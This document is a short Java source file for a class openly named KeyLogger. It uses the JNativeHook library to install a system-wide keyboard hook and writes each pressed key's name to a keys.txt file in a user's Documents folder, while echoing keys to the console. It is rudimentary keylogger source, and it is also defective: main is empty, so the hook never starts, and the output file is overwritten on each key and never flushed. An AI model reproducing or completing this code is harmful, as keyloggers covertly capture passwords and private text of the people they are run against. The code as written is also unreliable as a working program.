import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedWriter;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import javax.swing.JFrame;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger extends JFrame implements ActionListener, NativeKeyListener
{
	
	public static void main(String[] args) 
	{
		
	}
	
	public void KEY()
	{
		try  
		{
			GlobalScreen.registerNativeHook();
		} 
		catch (NativeHookException e1) 
		{
			e1.printStackTrace();
		}
		
		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}
	
	public void nativeKeyPressed(NativeKeyEvent e)
	{
		try 
		{
			
			FileOutputStream fos = new FileOutputStream("C:\\Users\\kasper\\Documents\\keys.txt");
            OutputStreamWriter osw = new OutputStreamWriter(fos, "UTF-8");
            BufferedWriter bw = new BufferedWriter(osw);
            bw.write(NativeKeyEvent.getKeyText(e.getKeyCode()).toString());
			if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Escape"))
			{
				System.out.print("");
				System.exit(0);
			}
			else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Space"))
			{
				System.out.print(" ");
			}
			else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Enter"))
			{
				System.out.println("");
			}
			else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Comma"))
			{
				System.out.print(",");
			}
			else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Delete"))
			{
				System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()).replace(NativeKeyEvent.getKeyText(e.getKeyCode()), ""));
			}
			else
			{
				System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
			}
		} 
		catch (IOException e1) 
		{
			e1.printStackTrace();
		}
	}
	
	public void nativeKeyReleased(NativeKeyEvent e)
	{
		
	}
	
	public void nativeKeyTyped(NativeKeyEvent e)
	{
		
	}

	

	@Override
	public void actionPerformed(ActionEvent e) 
	{
		
	}

}
